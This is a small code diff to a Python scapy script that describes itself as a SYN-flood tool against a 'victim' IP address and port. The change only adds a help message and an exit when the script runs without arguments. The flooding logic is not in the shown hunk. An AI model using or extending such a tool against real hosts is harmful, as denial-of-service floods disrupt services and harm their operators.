@@ -1,11 +1,15 @@
 from scapy.all import IP, TCP, Raw, RandShort, send, conf
 import argparse
+import sys
 
 conf.sniff_promisc = False
 
 parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
 parser.add_argument("-t", "--target", help="Victim IP Address to Syn Flood")
 parser.add_argument("-p", "--port", help="Victim Port to Syn Flood")
+if len(sys.argv)==1:
+    parser.print_help(sys.stderr)
+    sys.exit(1)
 args = parser.parse_args()
 
 target_ip, target_port = args.target, args.port
